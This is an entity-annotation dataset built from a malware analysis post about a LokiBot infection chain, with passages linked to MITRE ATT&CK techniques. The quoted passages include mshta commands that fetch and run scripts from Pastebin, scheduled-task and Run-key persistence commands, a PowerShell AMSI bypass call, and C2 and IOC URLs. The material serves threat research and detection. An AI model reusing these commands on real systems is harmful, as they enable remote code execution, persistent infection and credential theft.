"MALWARE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "AgentTesla", "context_left": "This last binary, consists of a sample of the Bot/Stealer LokiBot, practically unpacked, which at this point, is in a system without most of its protection measures. It is interesting that, up to this point, this campaign coincides in many points with [the following report](https://isc.sans.edu/forums/diary/", "context_right": "+Delivered+via+a+Malicious+PowerPoint+AddIn/26162) related to an AgentTesla infection campaign, but as in this case, the final threat is not developed in .Net, they have had to add this last extra loader, in order to inject malware developed in other languages, in other processes. The sample command and control server is “http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM” and although its main function is to act as a stealer, as it focuses on stealing credentials from all types of mail clients, FTP, browsers and many other services, it also acts as a bot, allowing some control over the computer by the actor behind this threat.", "_context_left": "It is interesting that, up to this point, this campaign coincides in many points with [the following report](https://isc.sans.edu/forums/diary/", "_context_right": "+Delivered+via+a+Malicious+PowerPoint+AddIn/26162) related to an AgentTesla infection campaign, but as in this case, the final threat is not developed in .Net, they have had to add this last extra loader, in order to inject malware developed in other languages, in other processes.", "sentence_left": "This last binary, consists of a sample of the Bot/Stealer LokiBot, practically unpacked, which at this point, is in a system without most of its protection measures.", "sentence_right": "The sample command and control server is “http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM” and although its main function is to act as a stealer, as it focuses on stealing credentials from all types of mail clients, FTP, browsers and many other services, it also acts as a bot, allowing some control over the computer by the actor behind this threat.", "label": "[Agent Tesla](https://attack.mitre.org/software/S0331) is a spyware Trojan written for the .NET framework that has been observed since at least 2014.(Citation: Fortinet Agent Tesla April 2018)(Citation: Bitdefender Agent Tesla April 2020)(Citation: Malwarebytes Agent Tesla April 2020)", "label_id": 846, "label_title": "Agent Tesla", "label_link": "https://attack.mitre.org/software/S0331", "entity_class": "CE", "entity_type": "MALWARE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "AgentTesla", "context_left": "This last binary, consists of a sample of the Bot/Stealer LokiBot, practically unpacked, which at this point, is in a system without most of its protection measures. It is interesting that, up to this point, this campaign coincides in many points with [the following report](https://isc.sans.edu/forums/diary/AgentTesla+Delivered+via+a+Malicious+PowerPoint+AddIn/26162) related to an", "context_right": "infection campaign, but as in this case, the final threat is not developed in .Net, they have had to add this last extra loader, in order to inject malware developed in other languages, in other processes. The sample command and control server is “http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM” and although its main function is to act as a stealer, as it focuses on stealing credentials from all types of mail clients, FTP, browsers and many other services, it also acts as a bot, allowing some control over the computer by the actor behind this threat.", "_context_left": "It is interesting that, up to this point, this campaign coincides in many points with [the following report](https://isc.sans.edu/forums/diary/AgentTesla+Delivered+via+a+Malicious+PowerPoint+AddIn/26162) related to an ", "_context_right": " infection campaign, but as in this case, the final threat is not developed in .Net, they have had to add this last extra loader, in order to inject malware developed in other languages, in other processes.", "sentence_left": "This last binary, consists of a sample of the Bot/Stealer LokiBot, practically unpacked, which at this point, is in a system without most of its protection measures.", "sentence_right": "The sample command and control server is “http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM” and although its main function is to act as a stealer, as it focuses on stealing credentials from all types of mail clients, FTP, browsers and many other services, it also acts as a bot, allowing some control over the computer by the actor behind this threat.", "label": "[Agent Tesla](https://attack.mitre.org/software/S0331) is a spyware Trojan written for the .NET framework that has been observed since at least 2014.(Citation: Fortinet Agent Tesla April 2018)(Citation: Bitdefender Agent Tesla April 2020)(Citation: Malwarebytes Agent Tesla April 2020)", "label_id": 846, "label_title": "Agent Tesla", "label_link": "https://attack.mitre.org/software/S0331", "entity_class": "CE", "entity_type": "MALWARE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "extra loader, in order to inject malware developed in other languages, in other processes.", "context_left": "This last binary, consists of a sample of the Bot/Stealer LokiBot, practically unpacked, which at this point, is in a system without most of its protection measures. It is interesting that, up to this point, this campaign coincides in many points with [the following report](https://isc.sans.edu/forums/diary/AgentTesla+Delivered+via+a+Malicious+PowerPoint+AddIn/26162) related to an AgentTesla infection campaign, but as in this case, the final threat is not developed in .Net, they have had to add this last", "context_right": "The sample command and control server is “http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM” and although its main function is to act as a stealer, as it focuses on stealing credentials from all types of mail clients, FTP, browsers and many other services, it also acts as a bot, allowing some control over the computer by the actor behind this threat.", "_context_left": "It is interesting that, up to this point, this campaign coincides in many points with [the following report](https://isc.sans.edu/forums/diary/AgentTesla+Delivered+via+a+Malicious+PowerPoint+AddIn/26162) related to an AgentTesla infection campaign, but as in this case, the final threat is not developed in .Net, they have had to add this last ", "_context_right": "", "sentence_left": "This last binary, consists of a sample of the Bot/Stealer LokiBot, practically unpacked, which at this point, is in a system without most of its protection measures.", "sentence_right": "The sample command and control server is “http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM” and although its main function is to act as a stealer, as it focuses on stealing credentials from all types of mail clients, FTP, browsers and many other services, it also acts as a bot, allowing some control over the computer by the actor behind this threat.", "label": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.", "label_id": 318, "label_title": "Process Injection", "label_link": "https://attack.mitre.org/techniques/T1055", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "command and control server is “http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM” and although its main function is to act as a stealer,", "context_left": "It is interesting that, up to this point, this campaign coincides in many points with [the following report](https://isc.sans.edu/forums/diary/AgentTesla+Delivered+via+a+Malicious+PowerPoint+AddIn/26162) related to an AgentTesla infection campaign, but as in this case, the final threat is not developed in .Net, they have had to add this last extra loader, in order to inject malware developed in other languages, in other processes. The sample", "context_right": "as it focuses on stealing credentials from all types of mail clients, FTP, browsers and many other services, it also acts as a bot, allowing some control over the computer by the actor behind this threat. IOCs", "_context_left": "The sample ", "_context_right": " as it focuses on stealing credentials from all types of mail clients, FTP, browsers and many other services, it also acts as a bot, allowing some control over the computer by the actor behind this threat.", "sentence_left": "It is interesting that, up to this point, this campaign coincides in many points with [the following report](https://isc.sans.edu/forums/diary/AgentTesla+Delivered+via+a+Malicious+PowerPoint+AddIn/26162) related to an AgentTesla infection campaign, but as in this case, the final threat is not developed in .Net, they have had to add this last extra loader, in order to inject malware developed in other languages, in other processes.", "sentence_right": "IOCs", "label": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.", "label_id": 195, "label_title": "Exfiltration Over C2 Channel", "label_link": "https://attack.mitre.org/techniques/T1041", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "command and control server is “http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM”", "context_left": "It is interesting that, up to this point, this campaign coincides in many points with [the following report](https://isc.sans.edu/forums/diary/AgentTesla+Delivered+via+a+Malicious+PowerPoint+AddIn/26162) related to an AgentTesla infection campaign, but as in this case, the final threat is not developed in .Net, they have had to add this last extra loader, in order to inject malware developed in other languages, in other processes. The sample", "context_right": "and although its main function is to act as a stealer, as it focuses on stealing credentials from all types of mail clients, FTP, browsers and many other services, it also acts as a bot, allowing some control over the computer by the actor behind this threat. IOCs", "_context_left": "The sample ", "_context_right": " and although its main function is to act as a stealer, as it focuses on stealing credentials from all types of mail clients, FTP, browsers and many other services, it also acts as a bot, allowing some control over the computer by the actor behind this threat.", "sentence_left": "It is interesting that, up to this point, this campaign coincides in many points with [the following report](https://isc.sans.edu/forums/diary/AgentTesla+Delivered+via+a+Malicious+PowerPoint+AddIn/26162) related to an AgentTesla infection campaign, but as in this case, the final threat is not developed in .Net, they have had to add this last extra loader, in order to inject malware developed in other languages, in other processes.", "sentence_right": "IOCs", "label": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.", "label_id": 318, "label_title": "Process Injection", "label_link": "https://attack.mitre.org/techniques/T1055", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "focuses on stealing credentials from all types of mail clients, FTP, browsers and many other services", "context_left": "It is interesting that, up to this point, this campaign coincides in many points with [the following report](https://isc.sans.edu/forums/diary/AgentTesla+Delivered+via+a+Malicious+PowerPoint+AddIn/26162) related to an AgentTesla infection campaign, but as in this case, the final threat is not developed in .Net, they have had to add this last extra loader, in order to inject malware developed in other languages, in other processes. The sample command and control server is “http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM” and although its main function is to act as a stealer, as it", "context_right": ", it also acts as a bot, allowing some control over the computer by the actor behind this threat. IOCs", "_context_left": "The sample command and control server is “http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM” and although its main function is to act as a stealer, as it ", "_context_right": ", it also acts as a bot, allowing some control over the computer by the actor behind this threat.", "sentence_left": "It is interesting that, up to this point, this campaign coincides in many points with [the following report](https://isc.sans.edu/forums/diary/AgentTesla+Delivered+via+a+Malicious+PowerPoint+AddIn/26162) related to an AgentTesla infection campaign, but as in this case, the final threat is not developed in .Net, they have had to add this last extra loader, in order to inject malware developed in other languages, in other processes.", "sentence_right": "IOCs", "label": "Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.", "label_id": 18, "label_title": "Credentials from Password Stores", "label_link": "https://attack.mitre.org/techniques/T1555", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "| <script language=”&#86;&#66;&#83;&#99;&#114;&#105;&#112;&#116;”>self.close</script> |", "context_left": "**id3** does not run anything, probably the author who is using this dropper did not need it and left it free, pointing to the next script hosted in Pastebin:", "context_right": "**id2** consists of a small script in powershell, which runs on every reboot and stays in a loop checking everything copied to the Windows clipboard.", "_context_left": "", "_context_right": "", "sentence_left": "**id3** does not run anything, probably the author who is using this dropper did not need it and left it free, pointing to the next script hosted in Pastebin:", "sentence_right": "**id2** consists of a small script in powershell, which runs on every reboot and stays in a loop checking everything copied to the Windows clipboard.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "| https://pastebin.com/raw/UTLkgL5Y |", "context_left": "| https://pastebin.com/raw/XCXpMvQC |", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "| https://pastebin.com/raw/XCXpMvQC |", "sentence_right": "", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "| https://j.mp/kasasjdoopoopasdskdd |", "context_left": "| http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM |", "context_right": "| https://pastebin.com/raw/ZnhyvWAU |", "_context_left": "", "_context_right": "", "sentence_left": "| http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM |", "sentence_right": "| https://pastebin.com/raw/ZnhyvWAU |", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "| $blind=[System.Reflection.Assembly]::Load($deblindB)[Amsi]::Bypass() |", "context_left": "The call to the first binary loaded, is as follows", "context_right": "The name of the funcion and class being called gives clues of its purpose.", "_context_left": "", "_context_right": "", "sentence_left": "The call to the first binary loaded, is as follows", "sentence_right": "The name of the funcion and class being called gives clues of its purpose.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "| https://pastebin.com/raw/VJDyrCD2 |", "context_left": "| https://pastebin.com/raw/d7kxMSZd |", "context_right": "| https://pastebin.com/raw/9dva5i24 |", "_context_left": "", "_context_right": "", "sentence_left": "| https://pastebin.com/raw/d7kxMSZd |", "sentence_right": "| https://pastebin.com/raw/9dva5i24 |", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "| https://pastebin.com/raw/ZnhyvWAU |", "context_left": "| https://j.mp/kasasjdoopoopasdskdd |", "context_right": "| https://pastebin.com/raw/d7kxMSZd |", "_context_left": "", "_context_right": "", "sentence_left": "| https://j.mp/kasasjdoopoopasdskdd |", "sentence_right": "| https://pastebin.com/raw/d7kxMSZd |", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "This script, first of all leaves some kind words for the analyst who is reviewing the execution flow of this threat, and informs us that he would like to change it’s job :).", "context_left": "Finally, the script executed by **id1** after being cleaned up a bit, contains the following relevant commands:", "context_right": "In terms of capabilities, mainly what it does is download two other executables developed in .Net with obfuscation techniques similar to those of the “**Defid**” executable.", "_context_left": "", "_context_right": "", "sentence_left": "Finally, the script executed by **id1** after being cleaned up a bit, contains the following relevant commands:", "sentence_right": "In terms of capabilities, mainly what it does is download two other executables developed in .Net with obfuscation techniques similar to those of the “**Defid**” executable.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "Note that, before the “MsgBox”, it executes “Shell” with two concatenated variables.", "context_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/2.png)", "context_right": "If we look at the content of those two variables, we can see that they contain the following string: “mshta.exe https://j.]mp/kasasjdoopoopasdskdd”, which causes the legitimate Windows interpreter “mshta” to execute a script hosted on the web that follows.", "_context_left": "", "_context_right": "", "sentence_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/2.png)", "sentence_right": "If we look at the content of those two variables, we can see that they contain the following string: “mshta.exe https://j.]mp/kasasjdoopoopasdskdd”, which causes the legitimate Windows interpreter “mshta” to execute a script hosted on the web that follows.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "The binary is obfuscated with ConfuserEx, therefore using some tool for the analysis, such as “de4dot-cex”, can make easier to analyze its content.", "context_left": "The name of the funcion and class being called gives clues of its purpose.", "context_right": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-54-27-1024x419.png)", "_context_left": "", "_context_right": "", "sentence_left": "The name of the funcion and class being called gives clues of its purpose.", "sentence_right": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-54-27-1024x419.png)", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "A twisted malware infection chain", "context_left": "", "context_right": "August 26, 2020", "_context_left": "", "_context_right": "", "sentence_left": "", "sentence_right": "August 26, 2020", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "The name of the funcion and class being called gives clues of its purpose.", "context_left": "| $blind=[System.Reflection.Assembly]::Load($deblindB)[Amsi]::Bypass() |", "context_right": "The binary is obfuscated with ConfuserEx, therefore using some tool for the analysis, such as “de4dot-cex”, can make easier to analyze its content.", "_context_left": "", "_context_right": "", "sentence_left": "| $blind=[System.Reflection.Assembly]::Load($deblindB)[Amsi]::Bypass() |", "sentence_right": "The binary is obfuscated with ConfuserEx, therefore using some tool for the analysis, such as “de4dot-cex”, can make easier to analyze its content.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "The call to the first binary loaded, is as follows", "context_left": "Once downloaded and deobfuscated, it loads them with “[System.Reflection.Assembly]::Load(XXX)” which allows him to directly call functions within these binaries from PowerShell.", "context_right": "| $blind=[System.Reflection.Assembly]::Load($deblindB)[Amsi]::Bypass() |", "_context_left": "", "_context_right": "", "sentence_left": "Once downloaded and deobfuscated, it loads them with “[System.Reflection.Assembly]::Load(XXX)” which allows him to directly call functions within these binaries from PowerShell.", "sentence_right": "| $blind=[System.Reflection.Assembly]::Load($deblindB)[Amsi]::Bypass() |", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "| http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM |", "context_left": "IOCs", "context_right": "| https://j.mp/kasasjdoopoopasdskdd |", "_context_left": "", "_context_right": "", "sentence_left": "IOCs", "sentence_right": "| https://j.mp/kasasjdoopoopasdskdd |", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "IOCs", "context_left": "The sample command and control server is “http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM” and although its main function is to act as a stealer, as it focuses on stealing credentials from all types of mail clients, FTP, browsers and many other services, it also acts as a bot, allowing some control over the computer by the actor behind this threat.", "context_right": "| http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM |", "_context_left": "", "_context_right": "", "sentence_left": "The sample command and control server is “http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM” and although its main function is to act as a stealer, as it focuses on stealing credentials from all types of mail clients, FTP, browsers and many other services, it also acts as a bot, allowing some control over the computer by the actor behind this threat.", "sentence_right": "| http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM |", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "It consists of a DLL that does what it promises, since it bypasses AMSI to avoid detection using a version practically identical to this technique “https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell”.", "context_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-54-27-1024x419.png)", "context_right": "After this, it downloads **a third executable** from Pastebin, decodes it and stores it in a variable that it calls $Cli2 and loads the second executable, also in .Net, and calls its function “Chris()” passing as parameters the string “notepad.exe” and the variable that contains the third executable.", "_context_left": "", "_context_right": "", "sentence_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-54-27-1024x419.png)", "sentence_right": "After this, it downloads **a third executable** from Pastebin, decodes it and stores it in a variable that it calls $Cli2 and loads the second executable, also in .Net, and calls its function “Chris()” passing as parameters the string “notepad.exe” and the variable that contains the third executable.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "| https://pastebin.com/raw/n9Zadz2P |", "context_left": "| https://pastebin.com/raw/9dva5i24 |", "context_right": "| https://pastebin.com/raw/XCXpMvQC |", "_context_left": "", "_context_right": "", "sentence_left": "| https://pastebin.com/raw/9dva5i24 |", "sentence_right": "| https://pastebin.com/raw/XCXpMvQC |", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "After cleaning up the script a bit, we can see that it triggers the execution of the following commands:", "context_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-26-12-55-21.png)", "context_right": "| ‘id1run mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU”run schtasks.exe “C:\\Windows\\System32\\schtasks.exe” /create /sc MINUTE /mo 60 /tn “xesefiliym” /tr “mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU” /F‘id2run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\trats2di => mshta.exe “https://pastebin.com\\raw\\d7kxMSZd”‘id3run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ => mshta.exe “https://pastebin.com\\raw\\VJDyrCD2”‘defidrun mshta.exe “https://pastebin.com\\raw\\9dva5i24”run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows notepad\\\\CurrentVersion\\\\Run\\\\rednefed => mshta.exe “https://pastebin.com\\raw\\9dva5i24” |", "_context_left": "", "_context_right": "", "sentence_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-26-12-55-21.png)", "sentence_right": "| ‘id1run mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU”run schtasks.exe “C:\\Windows\\System32\\schtasks.exe” /create /sc MINUTE /mo 60 /tn “xesefiliym” /tr “mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU” /F‘id2run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\trats2di => mshta.exe “https://pastebin.com\\raw\\d7kxMSZd”‘id3run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ => mshta.exe “https://pastebin.com\\raw\\VJDyrCD2”‘defidrun mshta.exe “https://pastebin.com\\raw\\9dva5i24”run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows notepad\\\\CurrentVersion\\\\Run\\\\rednefed => mshta.exe “https://pastebin.com\\raw\\9dva5i24” |", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "| https://pastebin.com/raw/XCXpMvQC |", "context_left": "| https://pastebin.com/raw/n9Zadz2P |", "context_right": "| https://pastebin.com/raw/UTLkgL5Y |", "_context_left": "", "_context_right": "", "sentence_left": "| https://pastebin.com/raw/n9Zadz2P |", "sentence_right": "| https://pastebin.com/raw/UTLkgL5Y |", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "| https://pastebin.com/raw/d7kxMSZd |", "context_left": "| https://pastebin.com/raw/ZnhyvWAU |", "context_right": "| https://pastebin.com/raw/VJDyrCD2 |", "_context_left": "", "_context_right": "", "sentence_left": "| https://pastebin.com/raw/ZnhyvWAU |", "sentence_right": "| https://pastebin.com/raw/VJDyrCD2 |", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "| https://pastebin.com/raw/9dva5i24 |", "context_left": "| https://pastebin.com/raw/VJDyrCD2 |", "context_right": "| https://pastebin.com/raw/n9Zadz2P |", "_context_left": "", "_context_right": "", "sentence_left": "| https://pastebin.com/raw/VJDyrCD2 |", "sentence_right": "| https://pastebin.com/raw/n9Zadz2P |", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "August 26, 2020", "context_left": "A twisted malware infection chain", "context_right": "Recently, a malware dropper received by mail has caught our attention as we have detected different samples sent to multiple targets in Spain, Portugal, Italy and Norway, although it has probably reached many more European countries.", "_context_left": "", "_context_right": "", "sentence_left": "A twisted malware infection chain", "sentence_right": "Recently, a malware dropper received by mail has caught our attention as we have detected different samples sent to multiple targets in Spain, Portugal, Italy and Norway, although it has probably reached many more European countries.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "Finally, the script executed by **id1** after being cleaned up a bit, contains the following relevant commands:", "context_left": "* ![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-46-35-1-1024x295.png)", "context_right": "This script, first of all leaves some kind words for the analyst who is reviewing the execution flow of this threat, and informs us that he would like to change it’s job :).", "_context_left": "", "_context_right": "", "sentence_left": "* ![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-46-35-1-1024x295.png)", "sentence_right": "This script, first of all leaves some kind words for the analyst who is reviewing the execution flow of this threat, and informs us that he would like to change it’s job :).", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}